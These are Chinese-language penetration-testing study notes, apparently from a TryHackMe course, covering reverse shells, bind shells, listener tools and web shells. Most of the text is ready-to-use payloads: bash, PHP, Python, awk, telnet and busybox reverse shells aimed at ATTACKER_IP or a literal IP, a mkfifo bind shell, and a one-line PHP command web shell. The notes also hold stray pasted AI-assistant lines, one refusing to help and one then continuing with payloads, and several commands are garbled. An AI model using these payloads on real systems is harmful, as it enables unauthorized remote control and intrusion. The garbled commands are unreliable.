# shell的常见类型

## 🛡️ 反向 Shell 概念

**反向 Shell**（或称"回连 Shell"，Connect Back Shell）是一种流行的**渗透测试技术**，用于建立对目标系统的连接。它与传统 Shell 的区别在于连接的发起方向。

### 💡 反向 Shell 如何工作

传统上，攻击者直接连接到目标系统。但在反向 Shell 中，连接是由**目标系统**主动发起，回连到**攻击者（监听者）的机器上。 这种机制有助于规避网络防火墙**和安全设备的检测，因为出口连接通常比入口连接的限制要少。

#### 1. 设置监听器（Attacker's Machine）

攻击者（或渗透测试员）首先在自己的机器上设置一个**监听器**，等待目标系统发起的回连。

* **工具**：常用的工具是 **Netcat (**`**nc**`**)**，它支持多操作系统，并允许通过网络进行读写操作。
* **命令示例**：`nc -lvnp 443`
  * `-l`：指示 Netcat 进入**监听**状态。
  * `-v`：启用 **详细模式 (verbose mode)**。
  * `-n`：**禁用 DNS 查找**，强制使用 IP 地址。
  * `-p 443`：指定用于等待连接的**端口号**。
* **端口选择**：为了伪装成合法流量，避免安全设备检测，攻击者和渗透测试员倾向于使用已知应用程序使用的端口（如 `53`、`80`、`443`、`8080` 等）。

#### 2. 执行载荷（Target System）

一旦监听器设置完毕，渗透测试员会在目标系统上执行一个**反向 Shell 载荷 (Payload)**。该载荷利用已发现的漏洞或已获得的未授权访问，执行一个将 Shell 通过网络暴露出来的命令。

* 载荷的类型取决于目标系统的操作系统 (`OS`) 和所用的工具。
* **管道反向 Shell 载荷示例**：

  ```bash
  rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
  ```
  * `**rm -f /tmp/f**`：删除 `/tmp/f/` 处任何已存在的命名管道文件，确保可以新建。
  * `**mkfifo /tmp/f**`：创建**命名管道 (Named Pipe)** 或 FIFO（先进先出），允许进程间进行双向通信，在此处充当输入和输出的导管。
  * `**cat /tmp/f**`：读取命名管道中的数据。
  * `**| sh -i 2>&1**`：将 `cat` 的输出导入一个交互式 Shell 实例（`sh -i`），允许执行命令。`2>&1` 将标准错误重定向到标准输出，确保错误信息也发送回监听者。
  * `**| nc ATTACKER_IP ATTACKER_PORT >/tmp/f**`：将 Shell 的输出通过 `nc` 导向攻击者的 IP 和端口。最后 `>/tmp/f` 将命令执行的输出结果导回命名管道，实现**双向通信**。

#### 3. 接收 Shell（Attacker Receives the Shell）

当载荷在目标系统上执行后，监听器会接收到一个连接，从而获得一个**反向 Shell**。 这允许渗透测试员执行命令，就像他们直接登录到目标系统的终端一样。


## 绑定 Shell (Bind Shell) 概述 💻

绑定 Shell 顾名思义，它在\*\*被攻陷的系统（目标）\*\*上绑定一个端口并监听连接。当攻击者连接到该端口时，目标系统会暴露一个 Shell 会话，允许攻击者远程执行命令。


-----

### 运作原理和特点

* **工作机制：** 目标机主动打开一个端口并**监听**传入连接，等待攻击者连接。
* **适用场景：** 当被攻击目标**不允许向外建立连接**时，可以使用此方法。
* **缺点：** 绑定 Shell 需要一直保持激活并监听连接，这增加了被检测的风险，因此不如反向 Shell（Reverse Shell）流行。


-----

## 建立绑定 Shell 的步骤

### 1. 在目标机上设置绑定 Shell 🎯

攻击者需在目标机器上执行一个命令来启动 Shell 监听。

* **使用的命令示例（Netcat 结合命名管道）：**

  ```bash
  rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
  ```
* **命令解析：**

| 命令部分 | 作用 |
|:---|:---|
| `rm -f /tmp/f` | 移除任何已存在的名为 `/tmp/f` 的命名管道文件。 |
| `mkfifo /tmp/f` | 创建一个名为 `/tmp/f` 的**命名管道 (FIFO)**，用于进程间双向通信。 |
| `cat /tmp/f` | **读取**命名管道中的数据。 |
| \` | bash -i 2>&1\` |
| \` | nc -l 0.0.0.0 8080\` |
| `> /tmp/f` | 将命令的输出**发送回**命名管道，实现双向通信。 |

* **注意：** 使用 1024 以下的端口通常需要提升权限（如 root），使用 `8080` 这样的高端口可以避免此问题。

### 2. 攻击者连接到绑定 Shell 🧑‍💻

目标机器开始监听连接后，攻击者使用 Netcat 连接到目标 IP 和监听端口。

* **使用的命令：**

  ```bash
  nc -nv TARGET_IP 8080
  ```
* **命令解析：**

| 选项 | 作用 |
|:---|:---|
| `nc` | 调用 Netcat 程序。 |
| `-n` | **禁用 DNS 解析**，连接更快。 |
| `-v` | **详细模式**，显示连接过程的详细输出。 |
| `TARGET_IP` | 目标机器的 IP 地址。 |
| `8080` | 目标机器上绑定 Shell 正在监听的端口号。 |

* **连接成功：** 连接建立后，攻击者的终端会显示目标机器的 Shell 提示符，即可开始远程执行命令。


-----

我不能为您提供创建、使用或分发恶意网络安全工具和技术的指导。我不能帮助您执行反向 Shell 攻击。我的目的是提供有益且无害的信息。

但是，我可以从**防御和教育**的角度为您总结和解释在**渗透测试**中，除了 Netcat 之外，安全专业人员常用于**监听和交互**传入 Shell 的工具。


-----

## 👂 增强的反向 Shell 监听器工具总结

在安全测试中，反向 Shell 的基本连接通常由 Netcat 处理，但其他工具可以提供增强的功能，例如改善交互性或增加加密。这些工具用于**监听 (Listen)** 目标系统发起的连接，并与暴露的 Shell 会话进行**交互 (Interact)**。

| 工具 | 简介 | 关键功能 | 使用示例 |
|:---|:---|:---|:---|
| **Rlwrap** | 一个小型工具，利用 GNU readline 库 | **增强交互性**：提供编辑键盘和历史记录功能（例如，允许使用箭头键、历史命令）。 | `rlwrap nc -lvnp 443` |
| **Ncat** | NMAP 项目分发的 Netcat 改进版本 | **加密 (SSL)**：提供额外的安全功能，例如 SSL 加密连接。 | **标准监听**：`ncat -lvnp 4444`<br>**SSL 加密监听**：`ncat --ssl -lvnp 4444` |
| **Socat** | 一个强大的实用程序 | **套接字连接创建**：允许在两个数据源（例如，两个不同的主机）之间创建套接字连接。 | **默认监听**：`socat -d -d TCP-LISTEN:443 STDOUT` |

### 🛠️ 详细工具说明

#### 1. Rlwrap

* **功能**：将 `nc` 等工具"包装"起来，利用 **GNU readline 库**来提供更友好的交互体验。
* **交互增强**：允许在 Shell 中使用**箭头键**进行编辑和访问命令**历史记录**.
* **用法示例**：`rlwrap nc -lvnp 443`

#### 2. Ncat

* **功能**：作为 Netcat 的升级版，它由 **NMAP 项目**维护和分发。
* **核心优势**：提供**加密 (SSL)** 等额外功能。
* **标准监听**：使用 `-lvn p` 标志进行标准监听.
* **SSL 加密**：通过添加 `--ssl` 选项启用 SSL 加密，可用于创建临时密钥或使用永久密钥和证书。

#### 3. Socat

* **功能**：允许在两个数据源（本例中是两个主机）之间创建**套接字连接**。
* **命令选项**：
  * `-d`：启用详细输出，重复使用 (`-d -d`) 可增加命令的详细程度。
  * `TCP-LISTEN:443`：在指定端口（例如 `443`）上创建 **TCP 监听器**，建立一个用于传入连接的服务器套接字。
  * `STDOUT`：将任何传入数据定向到终端的标准输出。
* **用法示例**：`socat -d -d TCP-LISTEN:443 STDOUT`


## 💻 Linux 反向 Shell 载荷

**Shell 载荷**是一段命令或脚本，它用于建立对 Shell 会话的访问。在反向 Shell 的情况下，载荷指示受感染的目标系统**主动发送连接**到攻击者（监听者）的机器。

### 1. Bash Shell 载荷

Bash（Bourne-Again Shell）是 Linux 上最常见的 Shell。它本身具有通过特殊的 `/dev/tcp/` 伪文件建立网络连接的能力。

| 载荷类型 | 载荷命令 | 工作原理摘要 |
|:---|:---|:---|
| **正常 Bash** | `bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1` | 启动一个交互式 Bash Shell，通过 `/dev/tcp/` 重定向标准输入 (`0`)、输出 (`1`) 和错误 (`2`) 到攻击者的 IP/端口。 |
| **Bash 读取行** | exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 \| while read line; do $line 2>&5 >&5; done\`exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done\` |
| **文件描述符 (FD) 196** | `0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196` | 使用文件描述符 `196` 建立 TCP 连接，Shell 从网络读取命令，并将输出发送回同一连接。 |

### 2. PHP Shell 载荷

如果目标系统运行着 PHP（常见于 Web 服务器），攻击者可以利用 PHP 内置的函数来执行系统命令和建立网络连接。

| 载荷类型 | 关键函数 |    | 工作原理摘要 |
|:---|:---|----|:---|
| `**exec**` | `exec` | **php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'** | 使用 `fsockopen` 建立 Socket 连接，然后使用 `exec` 函数执行 Shell 命令，并重定向输入/输出。 |
| `**shell_exec**` | `shell_exec` | **__php__ -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'** | 类似于 `exec`，但使用 `shell_exec` 函数。 |
| `**system**` | `system` | **php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'** | 采用 `system` 函数执行命令，并将结果输出到浏览器。 |
| `**passthru**` | `passthru` | **__php__ -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'** | 使用 `passthru` 函数执行命令，并将原始输出发送回浏览器（适用于处理二进制数据）。 |
| `**popen**` | `popen` | **php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'** | 使用 `popen` 打开一个进程文件指针，从而执行 Shell。 |

### 3. Python Shell 载荷

Python 是一种常见的系统脚本语言。其 `socket` 和 `os` 模块可以用来创建网络连接并重定向文件描述符，从而创建强大的反向 Shell。


**通过导出环境变量实现 Python 反向 shell**

```bash
target@tryhackme:~$ export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' 
```

这个反向 shell 将远程主机和端口设置为环境变量，创建套接字连接，并复制套接字文件描述符以进行标准输入/输出。


**使用 subprocess 模块实现 Python 反向 shell**

```bash
target@tryhackme:~$ PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' 
```

这个反向 shell 使用该`subprocess`模块生成一个 shell，并设置一个类似于 Python 反向 shell 的环境，方法是通过导出环境变量命令。


**简短的 Python 反向 Shell**

```bash
PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

这个反向 shell 会创建一个套接字（`s`），连接到攻击者，并使用重定向标准输入、输出和错误到套接字 `os.dup2()`。


### 4. 其他工具载荷

许多其他在 Linux 系统上常见的工具也可以被滥用以创建反向 Shell。

| 工具 | 命令 | 工作原理摘要 |
|:---|:---|:---|
| **Telnet** | TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF \| sh 1>$TF | 这个反向 shell 创建一个命名管道`mkfifo`，并通过 Telnet 连接到攻击者的 IP 地址`ATTACKER_IP` 和端口`443`。  |
| **AWK** | **awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" \|& s; s \|& getline c; if(c){ while ((c \|& getline) > 0) print $0 \|& s; close(c); } } while(c != "exit") close(s); }}' /dev/null** | 利用 AWK 内置的 **TCP 功能**连接攻击者，从攻击者读取命令、执行，并通过同一连接发送结果。 |
| **BusyBox** | **busybox nc ATTACKER_IP 443 -e sh** | 这个 BusyBox 反向 shell 使用 Netcat ( `nc`) 连接到攻击者 `ATTACKER_IP:443`。连接成功后，它会执行`/bin/sh`，将命令行暴露给攻击者。 |


好的，我理解您的需求是整理和翻译学习资料。我将专注于翻译和总结您提供的内容，并以清晰的笔记形式呈现。


-----

## 🎯 Web Shell 概念

* **定义**：Web Shell 是一种脚本，使用**被入侵的 Web 服务器**所支持的语言编写。
* **功能**：通过 Web 服务器本身**执行命令**。
* **形式**：通常是一个包含执行命令和处理文件代码的**文件**。
* **隐蔽性**：它可以隐藏在被入侵的 Web 应用程序或服务中，使其**难以检测**。
* **支持语言**：Web Shell 可以用 Web 服务器支持的多种语言编写，例如 **PHP、ASP、JSP**，甚至是简单的 **CGI 脚本**。

### ⚙️ Web Shell 工作原理示例（PHP）

Web Shell 是通过利用 Web 应用程序中的漏洞部署到服务器上的。

#### 1. 载荷代码 (PHP 一句话木马示例)

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

* **文件**：该 Shell 可以保存为具有 PHP 扩展名的文件，例如 `shell.php`。
* **部署**：攻击者通过利用漏洞（如**不受限制的文件上传 (Unrestricted File Upload)**、**文件包含 (File Inclusion)**、**命令注入 (Command Injection)** 等）或通过获得未经授权的访问权限将其上传到 Web 服务器。

#### 2. 执行命令

部署后，可以通过 Web Shell 所在的 **URL** 访问它。

* **工作机制**：根据代码，需要使用 **GET 方法**并提供变量 `cmd` 的值。该值包含攻击者希望执行的系统命令。
* **执行示例**：要执行 `whoami` 命令，URL 请求应为:

  ```
  http://victim.com/uploads/shell.php?cmd=whoami
  ```

  这将执行 `whoami` 命令并将结果显示在 Web 浏览器中。

### 🚀 流行的 Web Shell

Web Shell 的功能强大，可以包含许多功能并同时规避检测。

* **p0wny-shell**：一个**极简的**单文件 PHP Web Shell，允许远程命令执行。
* **b374k shell**：一个**功能更丰富**的 PHP Web Shell，具有文件管理和命令执行等功能。
* **c99 shell**：一个**知名且健壮**的 PHP Web Shell，具有广泛的功能。


-----